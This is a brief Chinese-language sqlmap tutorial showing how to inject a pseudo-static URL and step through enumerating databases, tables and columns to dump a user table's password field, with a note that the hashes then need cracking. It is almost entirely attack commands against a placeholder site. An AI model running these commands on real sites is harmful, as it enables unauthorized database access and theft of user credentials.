# sqlmap使用方法

参考文章

1. [i春秋 羽翼SQLMAP系列课程  >  伪静态注入](https://www.ichunqiu.com/course/1629)

## 1. 基本语法

```
$ sqlmap -u 目标url
```

其中目标url一般是含有`?id=12`这种格式参数的url. 如果url中伪静态类型如`/id/12.html`, 需要手动标记注入点(使用`*`号), 如`/id/12*.html`. sqlmap会自动探测可注入部分.

## 2. 使用流程

首先查找数据库.

```
$ sqlmap -u http://www.example.com/user/id/12*.html --dbs
```

> 如果已经通过其他方式得知目标数据库类型, 可以通过`--dbms mysql`这种形式在命令行中指明, 能够让sqlmap进行更精确的注入.

如果能得到目标网站的数据库名, 可以使用`-D`参数指定数据库, 进一步获取该库中的所有表. 这里假设目标库名为`db_test`.

```
$ sqlmap -u http://www.example.com/user/id/12*.html -D db_test --tables
```

ok, 如果得到了`db_test`中的所有表, 最主要的目标应该放在其中可能存放认证数据的表上面. 这里假设为`test_user`. 我们首先获取其中的字段信息, 也就是表的描述.

```
$ sqlmap -u http://www.example.com/user/id/12*.html -D db_test -T test_user --columns
```

其中可能的字段为`username`, `password`等

```
$ sqlmap -u http://www.example.com/user/id/12*.html -D db_test -T test_user -C password --dump
```

分别获取用户名和密码信息, 不过密码值应该会是md5加密过的, 所以还需要进一步进行解密.